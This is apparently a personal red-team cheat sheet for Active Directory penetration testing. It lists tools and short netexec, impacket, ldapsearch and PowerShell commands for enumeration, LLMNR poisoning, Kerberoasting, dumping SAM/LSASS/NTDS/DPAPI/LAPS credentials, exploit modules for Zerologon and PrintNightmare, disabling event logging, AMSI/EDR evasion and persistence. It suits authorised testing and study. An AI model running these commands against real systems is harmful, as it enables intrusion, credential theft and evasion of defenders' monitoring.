## Username Enumeration
- `lookupsid.py`
- `username-anarchy`
- `kerbrute`
- `GetADUsers.py`
- RID Brute
- RID Cycling
- `ADUserGen`
- Logged-On User Enumeration
- `ldapnomnom`
- `NauthNRPC`
- `namemash`
- [Username_Wordlist](https://github.com/insidetrust/statistically-likely-usernames)
- 

---

## SMB Enumeration
- `smbclient`
- `enum4linux`
- `enum4linux-ng`
- `CrackmapExec`
- `SMBmap`
- `smbcacls`
- `smbclient.py` *(impacket)*
- `lookupsid.py` *(impacket)*
- `samrdump.py`
- `Smbclient-ng`
- `smbstatus`

---

## NetBIOS Enumeration
- `nbtstat`
- `NBTscan`
- `nmblookup`
- `NBTEnum`

---

## RPC Enumeration
- `rpcclient`
- `rpcdump.py` *(Impacket)*

---

## LDAP Enumeration
- `ldapsearch`
- `ldapdomaindump`
- `windapsearch`
- `ldeep`

---

## DNS Enumeration
- `Dnsenum`
- `dnsrecon`
- `dnsdumpster`
- `host`
- `Viewdnsinfo`
- `Fierce`
- `dnsx`
- `puredns`
- `Dnschef`
- `Dnscat`

---

## Remote Ingestors
- `Bloodhound-py`
- `rusthound-ce`
- `Soaphound`
- `Shadowhound`
- `BOFHound`
- `LUDUShound`
- `Plumhound`
- `Sharphouns.exe/ps1`
- [Network Hound](https://github.com/MorDavid/NetworkHound)
- `Soapy`
- [BloodHound Cypher Cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
- [BloodHound Query Library](https://queries.specterops.io/)
- Taskhound

---

## Initial Attack Vectors

### Password Attacks
- LDAP-Based Password Spraying
- SMB-Based Password Spraying
- Kerberos-Based Password Spraying (`ntlm_passwordspray.py`)
- Password Reuse
- Enumerate Domain Password Policy
	```
		nxc smb $DOMAIN_CONTROLLER -d $DOMAIN -u $USER -p   $PASSWORD --pass-pol
	
	# Windows CMD
	net accounts
	
	# Rpcclient
	querydominfo
	```

### Null Authentication
- SMB Null Session and guest auth
- LDAP Anonymous Bind
```
ldapsearch -x -H ldap://dc-ip-here -s base namingcontexts

ldapsearch -x -H ldap://dc-ip-here -s base -b "" "(objectClass=*)" namingContexts


# Query all the objects in directory
ldapsearch -x -H ldap://dc-ip-here -D 'admin@contoso.org' -W -b 'DC=CONTOSO,DC=ORG' 'objectClass=*'

# Dump everything
ldapsearch -x -H ldap://10.129.89.167 -b "DC=baby,DC=vl" "*" | grep dn

# with netexec (only live accounts wil be shown)
netexec ldap  baby.vl -u '' -p ''

# users Description
netexec ldap  baby.vl -u '' -p '' --users

```
- RPC Anonymous Authentication

### Network Protocol Exploits
- LLMNR Poisoning
	```
	# Linux
	sudo responder -i <interface> -wf -v
	
	# Windows C# version need to compile it before
	.\inveigh.exe
	GET NTLMV2UNIQUE
	GET NTLMV2USERNAMES
	
	```
- NBT-NS Poisoning
- SMB Relay Attacks
- Pass-Back Attacks
- PXE Boot Abuse
- IPv6 Attacks
  - IPv6 via DNS Takeover

### Roasting
- Kerebroasting
	```
	nxc ldap <ip> -u user -p pass --kerberoasting output.txt
	```
- AS-REP Roasting (`Impacket-GetNPUsers.py`)
- Time Roasting
- Trust Roasting

### Mail Server Attacks
- `Mailsniper`
- `Invoke-usernameHarvestOWA`
- `PrivExchange`

### Internal Phishing
- VBA Office Macros
- Remote Template Injection
- HTTP Smuggling
  - `Evilgophish`
  - `Evilnginx`
- HTML Application(HTA)
	- We can create a msf  csharp payload and create a dll or exe file 
	- use Dotnettojsscript to convert dll  into js payload
	- embed this payload in HTA Document and serve it


### Miscellaneous
- Username Enumeration/Generation
  - `username-anarchy`
  - `ADUserGen`
  - `ldapnomnom`
  - `NauthNRPC`
  - `namemash`
  - `kerbrute`
  - [Wordl](https://github.com/insidetrust/statistically-likely-usernames)
- RID Cycling / Brute Forcing
- Check for Pre Created Computer Accounts
```
nxc ldap <ip>  -u username -p password -M pre2K
```
	- if u find a pre2k computer u can use netexec with `-k` to authenticate or use --generate-tgt-ticket . 0xdf retro machine
- Enumerate Machine Account Quota
- Check if ADCS is present or not
- MOTW Evasion
- payload delivery as pdf via html smuggling iso container and link trigger
- HTMl smuggling + containered payload delivery with bacdoored msi
- [Read](https://blog.delivr.to/delivr-tos-top-10-payloads-highlighting-notable-and-trending-techniques-fb5e9fdd9356)
- Check the Windows Server version and look for CVE's or latest vulns
```
 nxc smb 10.10.112.106  
```

## Host Reconnaissance

### Information Gathering
- Hostname
	```
	hostname
	```
- OS version
	```
	[System.Environment]::OSVersion.Version
	```
- Patches and Hot Fixes
	```
	wmic qfe get Caption,Description,HotFixID,InstalledOn
	```
- Environment Variables 
	```
	set
	
	Get-ChildItem Env: | ft Key,Value
	```
- Display the Domain name
	 ```
	 echo %USERDOMAIN%
	 ```
- Print the name of Domain Controller
	```
	echo %logonserver%
	```
- Enumerate for Powershell Execution Policy
	```
	Get-ExecutionPolicy -List
	```
- Bypass Script Execution Policy
	```
	Set-ExecutionPolicy Bypass -Scope Process Bypass
	```
- Get Powershell Command History
	```
	Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
	```
- PowerShell Script Block Logging
	- [Phant0m](https://github.com/olafhartong/Invoke-Phant0m)
	```
	# This will gib u powershell Version
	Get-host
	
	# Downgrade Powershell to evade Logging
	powershell.exe -version 2
	
	# Require Admin Privs
	Stop-Service Name EventLog
	```
- Logged-on Sessions
	```
	nxc smb --loggedon-users
	qwinsta
	```
- Enumerate the Password Policy
	```
	nxc smb $DOMAIN_CONTROLLER -d $DOMAIN -u $USER -p $PASSWORD --pass-pol
	
	# Windows CMD
	net accounts
	
	# Rpcclient
	querydominfo
	```
- Running Processes
	```
	Get-Process | Format-Table Id, Name, CPU, WS, PM -AutoSize
	```
- Dump all DNS data
	```
	adidnsdump -u 'domain.tld\usnm' -p 'pass' -r ldap://dc-ip:389
	```

- Find all domain groups
	```
	net group /domain
    dsquery group -limit 0
	````
- Check for Disabled Accounts
	 ```
	 # Powershell
	 Get-ADUser -Filter {(Enabled -eq $False)} -Properties Name, Enabled | select name, enabled
	 
	 # Dsquery
	 ddsquery user -disabled -limit 0 | dsget user -fn -ln
	 ```
- Enumerate Which users can RDP on to the Given Host
	```
	Get-NetLocalGroupMember -ComputerName <compname> -GroupName "Remote Desktop Users"
	```
- Enumerate Which users can winrm to the given Host
	```
		Get-NetLocalGroupMember -ComputerName <compname> -GroupName "Remote Management Users"
	```
- Active user sessions on remote computers (`Invoke-SessionHunter`)
- Machines in domain where current user has local admin access
  - `Find-WMILocalAdminAccess.ps1`
  - `FindPSRemotingLocalAdminAccess.ps1`
-  Fid the SID for Current Domain
	```
	Get-DomainSId
	```
- Find the List of Users in the domain and Properties
- Find all domains in the forest
- Find domain policy data
- Find all computer names in the domain
- Find all OUs in the domain
- Find the users in local Administrators group
- FInd Shares using PowerHuntShares
- Screenshot
- Clipboard Data
	```
	nxc smb <ip> -u username -p password -M notepad++
	```
- Check for any TGTS stored in the system
```
sudo find / -type f -name 'krb5cc_*' 2>/dev/null
```

###  Forest and Trust Enumeration
- [DomainTrustMapper](https://github.com/sixdub/DomainTrustExplorer)

```
 --- [1] BASIC DOMAIN TRUST ENUMERATION (Windows built-ins) ---

# List trusted domains known to the local machine
nltest /trusted_domains

# Query domain trusts for a specific domain
netdom query /domain:inlanefreight.local trust


 --- [2] ENUMERATION WITH POWERSHELL (AD Module) ---

# Get all trust objects visible to the current domain
Get-ADTrust -Filter *

# Retrieve details about the current forest (forest-wide info)
Get-Forest

# List all domains in the current forest
Get-ForestDomain

# List all global catalog servers in the current forest
Get-ForestGlobalCatalog

# Enumerate forest-level trusts
Get-ForestTrust


--- [3] ENUMERATION WITH POWERVIEW (Offensive/Red Team PowerShell) ---

# Enumerate domain trusts for the current domain
Get-DomainTrust

# Enumerate trusts for a specific domain
Get-DomainTrust -Domain <Domain_name>

# Show mapped trust relationships and details between domains
Get-DomainTrustMapping

# List users in a specific child domain
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName

# Enumerate users who are members of groups outside their primary domain
Get-DomainForeignUser -Domain <domain_name>

# Enumerate groups that contain users from other domains
Get-DomainForeignGroupMember

# Map and enumerate all trusts recursively across the forest
Invoke-MapDomainTrust

# Find users that are members of groups in other domains
Find-ForeignUser -Domain <domain>

# Find groups that contain members from other domains
Find-ForeignGroup -Domain <domain>


--- [4] ENUMERATION WITH NETEXEC / IMPACKET STYLE TOOLS ---

# Enumerate domain trusts using LDAP with credentials
nxc ldap <ip> -u <user> -p <pass> -M enum_trusts

# Trust Attacks
https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-1
```
### Security Controls Enumeration
```
# Enumerate Firewall
netsh advfirewall show allprofiles

# Defender Status
Get-MpComputerStatus
sc query windefend

# Information of Known Threats
Get-MpThreat

# Detailed detection history of threats found on the system.
Get-MpThreatDetection

# Current Settings for Microsoft Defender
Get-MpPreference

# Configure Defender Settings
Set-MpPreference

# Applocker Enum
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Powershell CLM 
$ExecutionContext.SessionState.LanguageMode

# Shows which groups are delegated** to read LAPS passwords in each OU using LAPStoolkit.ps1 tool
Find-LAPSDelegatedGroups

# Lists users/groups with "All Extended Rights" on LAPS-enabled computers.
Find-AdmPwdExtendedRights

# Lists computers with LAPS enabled.
Get-LAPSComputers


```
### Access Control & Group Policy
- Enumerate ACLs 
	- dacledit.py
```
# Powerview
Find-InterestingDomainACL

# single User Targeted Enumeration
$sid= Convert-NameToSid <username>
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}  -verbose

# dacledit.py
dacledit.py -target <user> -dc-ip <ip><Domain_name>/<username>:'<password>'
```

- Group Policy Enumeration
  - `Get-DomainGPO`
  - `SharpGPOAbuse`
  - `Group3r`
  - `GPOddity`
  -  [ADrecon](https://github.com/sense-of-security/ADRecon)
  - [pywerview](https://github.com/the-useless-one/pywerview)
	```
	# group3r
	python3 Group3r/group3r.py -d DOMAIN -u USER -p 'PASSWORD' --dc-ip DC_IP --json-out findings/group3r_all.json --scripts --delegation --interesting ; \
	
	# adrecon
	python3 ADRecon/adrecon.py -u 'DOMAIN\\USER' -p 'PASSWORD' -d DOMAIN --dc-ip DC_IP -o findings --format json ; \
	
	# pywerview
	python3 pywerview/pywerview.py -d DOMAIN -u USER -p 'PASSWORD' --dc-ip DC_IP --output findings/pywerview_all.json
	```

 - Group Policy Preference  Enumeration
	```
	# Null Session
	impacket-Get-GPPPassword -no-pass 'DOMAIN_CONTROLLER'

	# with Creds
	impacket-Get-GPPPassword 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
	
	# Netexec
	crackmapexec smb ip  -u user -p pass -M gpp_autologin
	```
### Keylogging & Recon Tools
- `Seatbelt`
- `ADRecon`
- `SharpView`
- `PowerView`
### Aurtomated Enumeration Tools
- Bloodhound
- SOAPhound

---

## Host Persistence
- `SharpPersist`
- [Read](https://hadess.io/wp-content/uploads/2023/11/Windows-Persistence.pdf)

## Host Privilege Escalation
- `SharpUp`
- `PowerUp`
- `Tokenvator`
- `Powersploit`
- `Privesc`
- `linWinPwn`
- `Lynis`
- Named Pipe Impersonation
- Named Pipe Hijacking
- COM Hijacking
- enigma0x3 blogs
- powerview
- Seatbelt

---

## Credential Harvesting Techniques

### Methods
- FInd Shares using PowerHuntShares
- Keystroke Logging
- SAM Database Dumping
	- Secretsdump.py
	- [Sharpsecdump](https://github.com/G0ldenGunSec/SharpSecDump)
	```
	nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam
	```
- LSASS Memory Dumping (`miniDump.net`)
	```
	nxc smb 192.168.255.131 -u administrator -p pass -M lsassy
	```
- Autologon Credential Dumping
- Windows Credential Manager (DPAPI)
	-[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
	-[donpwner](https://github.com/MorDavid/donpwner)
	-Donpapi
	```
	nxc smb <ip> -u <user> -p <pass> --dpapi
	```
- LAPS Credential Dumping
  - `LAPSToolkit`
  - `SharpLAPS`
  - `Get-GPPPassword.ps1
  - `impacket-getLAPSPassword`
	```
	nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --module laps
	```
- NTDS Hash Extraction (`ntdsutil`)
  - `gosecretsdump`
  - `ntdsdotsqlite`
	```
	 nxc smb <ip>  -u <user> -H <pass> --ntds
	```
- Kerberos Encryption Keys
- Domain Cached Credentials
- Kerberos Tickets (`LaZagne`)
- Dump Winscp
	```
	nxc smb <ip> -u <user> -p <pass> -M winscp
	```
- Dump Lsa
	```
	nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --lsa
	```
-  Credentials from Web Browsers
	- [Sharpweb](https://github.com/djhohnstein/SharpWeb)
	- [Sharpchrome](https://github.com/GhostPack/SharpDPAPI/tree/master/SharpChrome)
	- [Sharpweb](https://github.com/djhohnstein/SharpWeb)

---

## Post-Exploitation Attacks

### AMSI Bypass & PowerShell Logging Disable
- `Invisi-Shell`
- [PowerShdll](https://github.com/p3nt4/PowerShdll)
- [powerload3r](https://github.com/0xNinjaCyclone/PowerLoad3r)

### AMSI & Defender Detection Testing
- `AMSITrigger`
- `Defendercheck`
- `Invoke-obfscuation`

### Obfscuation Tools
- `Invoke-Obfuscation` – PowerShell script obfuscation
- Protect my tooling
- Confuserx

### .Net Tools
- [netloader](https://gist.github.com/Arno0x/2b223114a726be3c5e7a9cacd25053a2)

### Kerberoasting
- `Impacket-GetUserSPNs`
- `orpheus`
```
Listing all SPN Set Accounts
GetUserSPNs.py -dc-ip <ip> Domain/useername

# Request ALL TGS
GetUserSPNs.py -dc-ip <ip> Domain/useername -request

# Request TGS for a specifc Account
GetUserSPNs.py -dc-ip <ip> Domain/useername -request-user <user>
```


- Token Impersonation
- DCSync Attacks
- LNK-Based Attacks
- Remote Code Execution (`PsExec`)
- Security Controls Enumeration
- SMB Local Admin Access Spraying
- DACL Privilege Escalation
-  Find Computers Where a domain admin has sessions. List Sessions and Logged-on users
- Tombstone Reaping / Enumeration
- AD Recycle Bin Enumeration
Tools
	- Powerpick (opsec)

### Other Techniques

- Exchange-Related Group Membership Abuse
- Printer Bug (`MS-RPRN`)
	- [Tool](https://github.com/NotMedic/NetNTLMtoSilverTicket)
- MS14-068 (Forged PAC Attack)



---

## Active Directory Persistence
- Registry Run Keys
- Startup Folder
	```
	# Folder Path
		C:\Users\User_name\AppData\Roaming\Microsoft\Windows\Start
	```
- Logon Script
- Powershell Profile
- scheduled tasks
- COM Hijacking 
- Golden Ticket
- Silver Ticket
- DCSync
- Diamond Ticket
- Skeleton Key
- DSRM Abuse
- Custom SSP
- ACL Abuse (`AdminSDHolder`, `RightsAbuse`, `SecurityDescriptors`, `Powershell Remoting`, `SecurityDescriptors - Remote Registry`)
- Volume Shadow Copy Abuse
- Certificate Persistence
- SIDHistory Persistence
- Kerberos Delegation with Protocol Transition

---

## Credential & Ticket Attacks
- Silver Ticket
- Pass-the-Ticket
- Pass-the-Hash
- Over-the-Hash
- OverPass-the-Hash
- Token Store Abuse
- MakeToken

---

## Vulnerability Exploits
- NoPac
	```
	netexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac
	```
- PrintNightmare
	```
	nxc smb <ip> -u 'user' -p 'pass' -M spooler
	nxc smb <ip> -u '' -p '' -M printnightmare
	```
- PetitPotam
	```
	nxc smb <ip> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam
	```
- Zerologon
	```
	nxc smb <ip> -u '' -p '' -M zerologon
	```
- DCShadow
- Printerbug
- MS14-068
- MS14-025
- Ntlm Reflection
	```
	nxc smb 10.42.42.10 -u dave -p dragon -M ntlm_reflection
	```
---

## MS SQL Servers
### Enumeration
- `PowerUpSQL`
- `SQLRecon`

### Interaction
- `mssqlclient.py`
- [MSsqlPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
- 

---

## Microsoft Exchange
- `Mailsniper`
- `Ruler`

---

## SCCM
- `SharpSCCM`
- `SCCMHunter`
- `pxethief`

---

## Antivirus Evasion

### Powershell
- Check the State of Powershell Constrained Language Mode
	- [Bypass Tool](https://github.com/calebstewart/bypass-clm)
```
$ExecutionContext.SessionState.LanguageMode
```

### EDR
Capabilities:
- API hooking (e.g., via userland DLL injection)
- Process creation tracking (`CreateProcess`, `NtCreateUserProcess`)
- Memory scans for known shellcode patterns
- Call stack analysis
- Behavior-based detection (anomalous parent-child relationships, suspicious syscalls)
Evasion Tactics
- **Direct System Calls (SysWhispers, Hell’s Gate)**
- Parent Process Spoofing and PPID Spoofing
- Memory Artifact Reduction
#### AMSI
**AMSI Capabilities:**
- Hooks into scripting engines (PowerShell, JScript, VBScript)
- Scans deobfuscated code at runtime
- Blocks known malicious patterns via signature-based engines
- Exposes APIs like `AmsiScanBuffer`, `AmsiInitializ`

Evasion Tactics
- Patch AMSI in Memory (Inline Patch)
-  Manual Unhooking of amsi.dll
- PowerShell-Specific AMSI Bypasses

- `Syswhisper3`
- [Sharploader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)
- [scarecrow](https://github.com/optiv/ScareCrow)
- [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)
- [Micr0_Shell](https://github.com/senzee1984/micr0_shell)
- [hells gate]([https://github.com/am0nsec/HellsGate](https://github.com/am0nsec/HellsGate))
- [Pack my payload]([https://github.com/mgeeky/PackMyPayload](https://github.com/mgeeky/PackMyPayload))
- 

## Toolset Overview
- **AD_Miner** – AD attack path analysis & privilege investigation
- **SCCMHunter** – SCCM misconfigurations
- **linWinPwn** – Linux-based post-exploitation automation for AD
- **Evilgrade** – Software update exploit delivery
- **SharpWMI** – WMI-based remote execution
- **ADRecon** – AD configuration collection & reporting
- **ADExplorer** – GUI AD snapshot tool (Microsoft Sysinternals) can be used to take snapshot of AD and use bloodhound
- **ADExplorerSnapshot.py** – Parse `.adx` into BloodHound format
- **PortBender**
- **Ping Castle**
- **wald0.com** – BloodHound & graph theory
- **Coercer**
- Donut
- [Domain Hunter](https://github.com/threatexpress/domainhunter)
- [Dotnettojs](https://github.com/tyranid/DotNetToJScript)
- [Go365](https://github.com/optiv/Go365)
- [ntlm_theft](https://github.com/Greenwolf/ntlm_theft)
- LapsToolkit
- Gpp-Decrypt
- [Adidnsdump](https://github.com/dirkjanm/adidnsdump)
- Snaffler



## PowerShell Tools
- `Invoke-CradleCrafter` – Payload obfuscation
- `ByteToLineNumber.ps1` – Find number from offset
- `Winrs` – Alternative to PS Remoting
- `Invoke-DCOM`
- `Invoke-BOF`
- `RunOF`
- [Invoke-Enum](https://github.com/HernanRodriguez1/Invoke-Enum/)
- [psobf](https://github.com/TaurusOmar/psobf)
- Invoke-Mimikatz
- DomainPasswordSpray.ps1
- [ADRecon](https://github.com/adrecon/ADRecon)

### Fileless Execution Techniques

|Technique|Description|Example Use|
|---|---|---|
|**In-memory script execution**|Use interpreters like PowerShell to run downloaded/encoded scripts directly in RAM|PowerShell with `Invoke-Expression` or .NET reflection (simulated in labs)|
|**Assembly load from memory**|Load a .NET assembly directly from bytes in memory, without saving to disk|Using `Assembly.Load()` in a C# loader|
|**Process injection**|Put code into another process’s memory space|Testing EDR memory scanning|
|**LOLBAS execution**|Abuse Windows built-ins to pull and run payloads remotely|`mshta`, `certutil`, `rundll32`|
|**WMI Event Consumers**|Use Windows Management Instrumentation to trigger payloads without files|Persistence simulation|

### Logging and Monitoring Evasion Tools

- Ghostpack
- Sharploader
- Eventcleaner
- Nishang
- shinjector
- SharpEtwpatch
- Sharploader
- PatchETW
- ETWti
- Invoke-ETWBypass
- Silent trininty
- sharpbypass
- Brute ratel C4

### Run Time Detection Evasion

- amsi.fail
- Invoke-AMSIBypass
- AmsiDisable
- SharpAmsi
- Amsipatch
- Sharpsploit
- AMSITrigger

#### Some Other Funky Tools
- [DotnetoJscript](https://github.com/tyranid/DotNetToJScript)
	- **DotNetToJScript** is a tool that takes a .NET assembly (DLL/EXE) and wraps/embeds it into a JScript/HTA/JavaScript host so the .NET code can be loaded and executed on a Windows target (typically in‑memory) without dropping the original binary file.
- [Neoconfuserx](https://github.com/XenocodeRCE/neo-ConfuserEx)
	- **Neo‑ConfuserEx** is a .NET obfuscator/packer — it scrambles and hides the real code inside a .NET EXE/DLL so it’s hard to read or analyze.
- [Donut](https://github.com/TheWover/donut)
	- Donut takes an executable file or script and converts it into a self-contained blob of shellcode. The generated shellcode can be injected directly into a legitimate, running process on the target system. This allows the payload to execute entirely in memory without ever being written to the disk, making it difficult for signature-based antivirus solutions to detect








#### Power shell techniques
- To run an executable file with arguments in PowerShell and detach it from the console, preventing it from showing a window and allowing the console to close without terminating the process,
```
Start-Process -FilePath "C:\Path\To\YourExecutable.exe" -ArgumentList "arg1", "arg2", "arg3" -WindowStyle Hidden -NoNewWindow
```
- To run an executable (.exe) file in the background using `Start-Job` in PowerShell, you need to wrap the `Start-Process` command within a script block that is then passed to `Start-Job`. This creates a background job that executes the .exe without interacting with the current PowerShell session.
```
Start-Job -ScriptBlock { Start-Process -FilePath "C:\Path\To\YourApplication.exe" -ArgumentList "optional arguments" -WindowStyle Hidden }
```
- Use `get-job` and `get-process` to view shit we started

